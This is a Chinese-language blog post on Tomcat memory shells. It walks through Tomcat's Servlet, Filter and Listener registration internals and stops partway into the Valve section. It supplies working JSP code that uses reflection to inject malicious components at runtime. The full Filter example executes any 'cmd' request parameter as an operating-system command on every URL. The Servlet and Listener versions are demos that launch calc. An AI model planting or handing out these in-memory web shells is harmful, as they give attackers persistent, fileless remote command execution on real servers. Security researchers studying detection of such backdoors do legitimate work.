<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Tomcat内存马 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Tomcat内存马   Servlet内存马下面是基于动态注册Servlet的内存马实现 首先要了解Servlet是如何被注册的，注册的过程是怎样的。按照正常的实现Servlet，是需要在web.xml里面进行配置的，如： &lt;servlet&gt;   &lt;servlet-name&gt;Test&lt;&#x2F;servlet-name&gt;   &lt;servlet-class&gt;T">
<meta property="og:type" content="article">
<meta property="og:title" content="Tomcat内存马">
<meta property="og:url" content="http://example.com/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Tree&#39;s Blog">
<meta property="og:description" content="Tomcat内存马   Servlet内存马下面是基于动态注册Servlet的内存马实现 首先要了解Servlet是如何被注册的，注册的过程是怎样的。按照正常的实现Servlet，是需要在web.xml里面进行配置的，如： &lt;servlet&gt;   &lt;servlet-name&gt;Test&lt;&#x2F;servlet-name&gt;   &lt;servlet-class&gt;T">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-1p2jl1_2560x1440.png">
<meta property="article:published_time" content="2023-08-28T13:12:37.000Z">
<meta property="article:modified_time" content="2023-09-06T07:43:30.257Z">
<meta property="article:author" content="Tree">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-1p2jl1_2560x1440.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/08/28/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tomcat内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-06 15:43:30'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-1p2jl1_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Tomcat内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-28T13:12:37.000Z" title="发表于 2023-08-28 21:12:37">2023-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-06T07:43:30.257Z" title="更新于 2023-09-06 15:43:30">2023-09-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tomcat内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692693168658-7d57c5bf-e47a-40e6-8103-aecffb58fa90.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692932556217-c10363e6-55fb-43a8-bbba-afec2ce3f84e.png"></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/5.png" alt="img"></p>
<h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><p>下面是基于动态注册Servlet的内存马实现</p>
<p>首先要了解Servlet是如何被注册的，注册的过程是怎样的。<br>按照正常的实现Servlet，是需要在web.xml里面进行配置的，如：</p>
<pre><code class="xml">&lt;servlet&gt;
  &lt;servlet-name&gt;Test&lt;/servlet-name&gt;
  &lt;servlet-class&gt;Test&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
  &lt;servlet-name&gt;Test&lt;/servlet-name&gt;
  &lt;url-pattern&gt;/test&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
</code></pre>
<p>要实现动态注册，那就要先去了解这个web.xml是如何被解析并且获取servlet的</p>
<p>解析web.xml的类是org.apache.catalina.startup.ContextConfig的webConfig()方法<br>这个方法的具体逻辑，在英文注释中说的很清楚了，概括起来包括以下两点：<br>:::info<br>1.合并Tomcat全局web.xml 、当前应用中的web.xml 、web-fragment.xml和web应用的注解中的配置信息<br>2.将解析出的各种配置信息（如Servlet配置、Filter配置、Listener配置等）关联到Context对象中<br>:::<br>而上面提到的第二点，是通过configureContext方法完成的，依次读取了 Filter、Listenert、Servlet的配置及其映射</p>
<p>这里逻辑就比较清晰了，就是调用Context的add方法、set方法配置Context<br>例如解析Servlet配置的代码：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686079197-712369cf-0327-4c0b-a0dd-757b60622425.png" alt="image.png"></p>
<p>首先获取web.xml中所有的<code>&lt;servlet&gt;</code>标签下的<code>&lt;servlet-name&gt;</code>和<code>&lt;servlet-class&gt;</code>，然后遍历所有的servlet<br>每次遍历都会创建一个wrapper对象，this.context是StandardContext<br>如果xml中设置了优先级LoadOnStartUp(没设置默认是-1)，则进行设置，<br>:::info<br>load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法).这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序.当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。当值为0或者大于0时，表示服务器在启动时就加载这个servlet.该容器肯定可以保证被标记为更小的整数的servlet比被标记为更大的整数的servlet更先被调用,还可已选择同样的load-on-start-up值来夹在servlets.<br>补充:正数的值越小，启动该servlet的优先级越高<br>:::<br>然后根据xml存储servlet Name ，也就是<code>&lt;servlet-name&gt;</code>部分</p>
<p>下面的代码是设置init()参数，没有就跳过</p>
<pre><code class="java">Map&lt;String, String&gt; params = servlet.getParameterMap();
var7 = params.entrySet().iterator();

while(var7.hasNext()) &#123;
    Map.Entry&lt;String, String&gt; entry = (Map.Entry)var7.next();
    wrapper.addInitParameter((String)entry.getKey(), (String)entry.getValue());
&#125;
</code></pre>
<p>往下就是将<code>&lt;servlet-class&gt;</code>放到wrapper里<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686782367-391064d4-bb99-4136-a122-d3d571449190.png" alt="image.png"></p>
<p>配置好wrapper后添加到Context里 ，然后到处理路由绑定部分，也就是<servlet-mapping><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692686897063-1c36e134-4ec3-401e-899e-d50b5328012e.png" alt="image.png"><br>循环遍历所有的mapping使用this.context.addServletMappingDecoded()将url路径和servlet类做映射。(这里的&#x2F;test、Test就是我们在Mapper中设置的值)</p>
<p>servlet注册流程：</p>
<ol>
<li>通过 context.createWapper() 创建 Wapper 对象；</li>
<li>设置 Servlet 的 LoadOnStartUp(优先级) 的值；</li>
<li>设置 Servlet 的 Name；</li>
<li>设置 Servlet 对应的 Class；</li>
<li>通过addChild()将创建并配置好的 Wrapper 添加到 Context 中</li>
<li>通过addServletMappingDecoded()将 url 路径和 servlet 类做映射。</li>
</ol>
<p>现在还有一个问题没解决，就是创建Wapper 对象的this.context(StandardContext)如何获取？<br>这个似乎要根据具体环境来定，如果是在jsp的环境下，可以通过request对象用反射获取<br>例如request对象存在一个getServletContext()方法 ，调试发现其获取到的是ApplicationContext<br>:::info<br>ServletContext servletContext &#x3D; request.getServletContext();<br>:::<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692689171584-67906858-c940-4726-b011-a5e74ee404d4.png" alt="image.png"><br>在这个ApplicationContext里面就能找到StandardContext<br>获取StandardContext的代码如下</p>
<pre><code class="java">ServletContext servletContext = request.getServletContext();
Field Context = servletContext.getClass().getDeclaredField(&quot;context&quot;);
Context.setAccessible(true);
ApplicationContext applicationContext =(ApplicationContext) Context.get(servletContext);

Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stcontext.setAccessible(true);
StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);
</code></pre>
<p>还可以这样获取：</p>
<pre><code class="java">Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext stdcontext = (StandardContext) req.getContext();
</code></pre>
<p>然后就是根据上面的流程进行注册servlet<br>先写个马</p>
<pre><code class="java">&lt;%!
public class Memshell extends HttpServlet &#123;
@Override
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
    Runtime.getRuntime().exec(&quot;calc&quot;);
&#125;

@Override
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;
&#125;
&#125;
%&gt;
</code></pre>
<p>获取StandardContext</p>
<pre><code class="java">ServletContext servletContext = request.getServletContext();
Field Context = servletContext.getClass().getDeclaredField(&quot;context&quot;);
Context.setAccessible(true);
ApplicationContext applicationContext =(ApplicationContext) Context.get(servletContext);

Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stcontext.setAccessible(true);
StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);
</code></pre>
<p>注册</p>
<pre><code class="java">Wrapper wrapper = standardContext.createWrapper();
wrapper.setName(&quot;aaa&quot;);
wrapper.setServletClass(Memshell.class.getName());
wrapper.setLoadOnStartup(1);
wrapper.setServlet(new Memshell()); //实例化servlet对象
standardContext.addChild(wrapper);
standardContext.addServletMappingDecoded(&quot;/shell&quot;,&quot;aaa&quot;);
</code></pre>
<p>利用的时候，先访问这个恶意的jsp，让servlet先注册进去，再访问这个内存马路径&#x2F;shell<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692689991992-c52b3b8d-23c7-4933-8575-e1aa97789688.png" alt="image.png"></p>
<h2 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h2><p> 这里的逻辑是也是参考了tomcat处理web.xml中filter配置进行注册filter的过程，</p>
<pre><code class="xml">&lt;filter&gt;
  &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;
  &lt;filter-class&gt;TestFilter&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
  &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;
  &lt;url-pattern&gt;/test&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre>
<p>也是在org.apache.catalina.startup.ContextConfig的configureContext()方法<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692762725809-114e568c-f4aa-4efc-9d92-a9508b1fe0db.png" alt="image.png"></p>
<p>主要有两步context.addFilterDef和context.addFilterMap，其中context还是StandardContext<br>filter是FilterDef对象，可以根据调试内容进行创建修改值<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692763018269-4f58fcb5-dc30-44e5-96d6-1f90b2f98cb4.png" alt="image.png"><br>主要是设置了filterName和filterClass，可以使用反射修改，但是这里不需要这么麻烦，FilterDef提供了set方法进行设置</p>
<pre><code class="java">FilterDef filter = new FilterDef();
filter.setFilterName(&quot;MemFilter&quot;);
filter.setFilterClass(MemFilter.class.getName());
filter.setAsyncSupported(&quot;false&quot;);
filter.setFilter(new MemFilter());//实例化
</code></pre>
<p>还有filterMap,这个是FilterMap对象，用于filter绑定路径<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692763453454-056dab1f-319c-49e3-9bbe-81808491d070.png" alt="image.png"></p>
<pre><code class="java">FilterMap filterMap = new FilterMap();
filterMap.setFilterName(&quot;MemFilter&quot;);
filterMap.addURLPattern(&quot;/*&quot;);
</code></pre>
<p>然后就是获取StandardContext,将filter进行注册</p>
<pre><code class="java">standardContext.addFilterDef(filter);
standardContext.addFilterMap(filterMap);
</code></pre>
<p>看似已经完成注册了，实际上还有许多步骤没有完成<br>调试往下会发现，在org.apache.catalina.core.StandardContext#filterStart中</p>
<pre><code class="java">public boolean filterStart() &#123;
    if (this.getLogger().isDebugEnabled()) &#123;
        this.getLogger().debug(&quot;Starting filters&quot;);
    &#125;

    boolean ok = true;
    synchronized(this.filterConfigs) &#123;
        this.filterConfigs.clear();
        Iterator var3 = this.filterDefs.entrySet().iterator();

        while(var3.hasNext()) &#123;
            Map.Entry&lt;String, FilterDef&gt; entry = (Map.Entry)var3.next();
            String name = (String)entry.getKey();
            if (this.getLogger().isDebugEnabled()) &#123;
                this.getLogger().debug(&quot; Starting filter &#39;&quot; + name + &quot;&#39;&quot;);
            &#125;

            try &#123;
                ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, (FilterDef)entry.getValue());
                this.filterConfigs.put(name, filterConfig);
            &#125; catch (Throwable var8) &#123;
                Throwable t = ExceptionUtils.unwrapInvocationTargetException(var8);
                ExceptionUtils.handleThrowable(t);
                this.getLogger().error(sm.getString(&quot;standardContext.filterStart&quot;, new Object[]&#123;name&#125;), t);
                ok = false;
            &#125;
        &#125;

        return ok;
    &#125;
&#125;
</code></pre>
<p>首先对filterDefs进行foreach，可以看到这是一个HashMap，对应是&lt;key,Object&gt;，具体是过滤器名称和FilterDef对象<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692773155501-6efda5bd-7063-494a-bb17-a89a51c7f70e.png" alt="image.png"><br>再往下，对filterConfigs这个HashMap设置ApplicationFilterConfig<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692773252581-a0d6750d-af63-4551-bd90-4c0e7f5ac996.png" alt="image.png"></p>
<p>所以要给 this.filterConfigs加点小料 ，this是StandardContext</p>
<p>因为ApplicationFilterConfig类不为public类型，所以只能通过反射进行创建对象，filterConfigs也是私有属性，也只能通过反射设置</p>
<pre><code class="java">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filter);

Field filterConfigsField = StandardContext.class.getDeclaredField(&quot;filterConfigs&quot;);
filterConfigsField.setAccessible(true);
Map filterConfigs = (Map) filterConfigsField.get(standardContext);
filterConfigs.put(&quot;MemFilter&quot;, filterConfig);
</code></pre>
<p>完整代码如下：</p>
<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%!
public class MemFilter implements Filter &#123;
    public void init(FilterConfig config) throws ServletException &#123;
    &#125;
    public void destroy() &#123;
    &#125;
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123;
        String c = request.getParameter(&quot;cmd&quot;);
        if(!c.isEmpty())
        &#123;
            Runtime.getRuntime().exec(c);
        &#125;
        chain.doFilter(request, response);

    &#125;
&#125;

%&gt;



&lt;%
ServletContext servletContext = request.getServletContext();
Field context = servletContext.getClass().getDeclaredField(&quot;context&quot;);
context.setAccessible(true);
ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);
Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stcontext.setAccessible(true);
StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);


FilterDef filter = new FilterDef();
filter.setFilterName(&quot;MemFilter&quot;);
filter.setFilterClass(MemFilter.class.getName());
filter.setAsyncSupported(&quot;false&quot;);
filter.setFilter(new MemFilter());

standardContext.addFilterDef(filter);


FilterMap filterMap = new FilterMap();
filterMap.setFilterName(&quot;MemFilter&quot;);
filterMap.addURLPattern(&quot;/*&quot;);
//filterMap.setDispatcher(DispatcherType.REQUEST.name());

standardContext.addFilterMap(filterMap);


Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filter);

Field filterConfigsField = StandardContext.class.getDeclaredField(&quot;filterConfigs&quot;);
filterConfigsField.setAccessible(true);
Map filterConfigs = (Map) filterConfigsField.get(standardContext);
filterConfigs.put(&quot;MemFilter&quot;, filterConfig);

%&gt;
</code></pre>
<p>注入成功<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692774514297-968b4d07-f607-45a7-8929-2285dffb679c.png" alt="image.png"></p>
<p>按照网上的文章，上面的代码还缺少了一句,目前还不知道是干嘛用的</p>
<pre><code class="java">filterMap.setDispatcher(DispatcherType.REQUEST.name());
</code></pre>
<p>setDispatcher的代码如下：</p>
<pre><code class="java">public void setDispatcher(String dispatcherString) &#123;
String dispatcher = dispatcherString.toUpperCase(Locale.ENGLISH);
if (dispatcher.equals(DispatcherType.FORWARD.name())) &#123;
    this.dispatcherMapping |= 2;
&#125; else if (dispatcher.equals(DispatcherType.INCLUDE.name())) &#123;
    this.dispatcherMapping |= 4;
&#125; else if (dispatcher.equals(DispatcherType.REQUEST.name())) &#123;
    this.dispatcherMapping |= 8;
&#125; else if (dispatcher.equals(DispatcherType.ERROR.name())) &#123;
    this.dispatcherMapping |= 1;
&#125; else if (dispatcher.equals(DispatcherType.ASYNC.name())) &#123;
    this.dispatcherMapping |= 16;
&#125;

&#125;
</code></pre>
<h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>Servlet 规范中定义了 8 个监听器接口，可以用于监听 ServletContext、HttpSession 和 ServletRequest 对象的生命周期和属性变化事件  <a target="_blank" rel="noopener" href="http://c.biancheng.net/servlet2/listener.html">http://c.biancheng.net/servlet2/listener.html</a><br>但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口</p>
<p>简单写一个listener,在web.xml配置好</p>
<pre><code class="xml">&lt;listener&gt;
  &lt;listener-class&gt;TestListener&lt;/listener-class&gt;
&lt;/listener&gt;
</code></pre>
<p>同样的在org.apache.catalina.startup.ContextConfig的configureContext()方法中<br>相关代码只有这点<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692845665551-3d3b5129-ee6c-4b5a-99fa-0f4231c4c92e.png" alt="image.png"><br>但是context.addApplicationListener接受的参数是字符串，即listener的类名，猜测是通过名字进行实例化</p>
<p>在StandardContext的这个类下的listenerStart里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692847758368-626f907c-b677-4ffb-bf1d-0bcc8844934b.png" alt="image.png"><br>首先获取刚刚存储的类名，然后实例化保存到results里面</p>
<p>然后往下，这里会判断listener的类型进行添加到eventListeners数组里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692848575750-7f250864-f366-4aae-aced-22238947b933.png" alt="image.png"><br>然后调用了setApplicationEventListeners()添加到applicationEventListenersList里面<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692849156795-7ff25b7b-b53c-4d09-ae73-23f557ae8300.png" alt="image.png"></p>
<pre><code class="java">public void setApplicationEventListeners(Object[] listeners) &#123;
    this.applicationEventListenersList.clear();
    if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;
        this.applicationEventListenersList.addAll(Arrays.asList(listeners));
    &#125;

&#125;
</code></pre>
<p>然后在fireRequestInitEvent()方法中调用了getApplicationEventListeners()，又把eventListeners数组掏出来了<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692849376736-6ef8904a-847b-4e54-ae61-696bcfff78cb.png" alt="image.png"><br>往下调用listener.requestInitialized(event)，执行了listener的requestInitialized方法进行初始化</p>
<p>所以只要将实例化后的listener对象放到ApplicationEventListeners数组里就可以了，StandardContext自带了个addApplicationEventListener方法</p>
<pre><code class="java">public void addApplicationEventListener(Object listener) &#123;
this.applicationEventListenersList.add(listener);
&#125;
</code></pre>
<p>先写个ServletRequestListener马,把马写到requestInitialized方法里，这样每次发起请求的初始化就会调用requestInitialized</p>
<pre><code class="javascript">&lt;%!
  public class memListener implements ServletRequestListener &#123;
  @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;
  &#125;

  @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;

      try &#123;
        Runtime.getRuntime().exec(&quot;calc&quot;);
      &#125; catch (IOException e) &#123;
        throw new RuntimeException(e);
      &#125;
    &#125;
&#125;
%&gt;
</code></pre>
<p>获取StandardContext</p>
<pre><code class="java">ServletContext servletContext = request.getServletContext();
Field context = servletContext.getClass().getDeclaredField(&quot;context&quot;);
context.setAccessible(true);
ApplicationContext applicationContext =(ApplicationContext) context.get(servletContext);
Field stcontext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stcontext.setAccessible(true);
StandardContext standardContext = (StandardContext) stcontext.get(applicationContext);
</code></pre>
<p>实例化注册</p>
<pre><code class="java">standardContext.addApplicationEventListener(new memListener());
</code></pre>
<p>效果<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692859023422-fed1e404-20e0-403a-bf68-373da3b7c741.png" alt="image.png"></p>
<h2 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h2><p>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。<br>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 addValve 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692863686421-af66acb0-6cc0-4381-b69b-eb4c43cbdbc0.png" alt="image.png"><br>Tomcat 每个层级的容器（Engine、Host、Context、Wrapper），都有基础的 Valve 实现（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），他们同时维护了一个 Pipeline 实例（StandardPipeline)，也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 Valve 的基础实现都继承了 ValveBase</p>
<p>看看Pipeline接口，继承了Contained接口</p>
<pre><code class="java">public interface Pipeline extends Contained &#123;
 
    public Valve getBasic();
 
    public void setBasic(Valve valve);
 
    public void addValve(Valve valve);
 
    public Valve[] getValves();
 
    public void removeValve(Valve valve);
 
    public void findNonAsyncValves(Set&lt;String&gt; result);
&#125;
</code></pre>
